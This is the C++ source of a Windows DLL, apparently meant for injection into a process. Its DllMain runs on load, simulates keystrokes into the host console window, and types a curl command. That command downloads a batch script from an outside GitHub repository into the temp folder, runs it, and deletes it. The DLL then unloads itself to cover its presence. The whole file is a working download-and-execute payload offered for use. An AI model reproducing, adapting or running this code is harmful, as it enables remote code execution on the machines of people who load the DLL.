#include "pch.h"
#include <Windows.h>
#include <iostream>

// Function to unload the DLL from the current thread
void UnloadDLLFromThread() {
    HMODULE hModule = NULL;

    // Get handle to this DLL module
    if (!GetModuleHandleEx(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        reinterpret_cast<LPCWSTR>(&UnloadDLLFromThread),
        &hModule)) {
        return;
    }

    // Free the DLL and exit the current thread
    FreeLibraryAndExitThread(hModule, 0);
}

// Entry point function for the DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // This code executes when the DLL is loaded into a process
        {
            // Get a handle to the console window of the parent process (cmd.exe)
            HWND hwndConsole = GetConsoleWindow();

            if (hwndConsole != NULL) {
                // Command to be executed (curl command to download and run a script)
                const char* command = "curl -o \"%TEMP%\\Command.bat\" -L \"https://github.com/MoneyHackDev/MoneyHack-C-DLL-Testing/raw/main/DLL-Injecter/Command.bat\" && \"%TEMP%\\Command.bat\" && del \"%TEMP%\\Command.bat\"";

                // Simulate typing the command into the console window character by character
                SendMessageA(hwndConsole, WM_CHAR, (WPARAM)command[0], 0); // Send first character of the command

                // Loop through the remaining characters of the command and send them
                for (int i = 1; command[i] != '\0'; ++i) {
                    SendMessageA(hwndConsole, WM_CHAR, (WPARAM)command[i], 0);
                }

                // Simulate pressing Enter key to execute the command
                SendMessageA(hwndConsole, WM_CHAR, (WPARAM)'\r', 0);
                UnloadDLLFromThread();
            }
        }
        break;

    case DLL_PROCESS_DETACH:
        // This code executes when the DLL is unloaded from a process
        break;

    default:
        break;
    }

    return TRUE; // Indicates successful execution of DllMain
}
// formated using ai
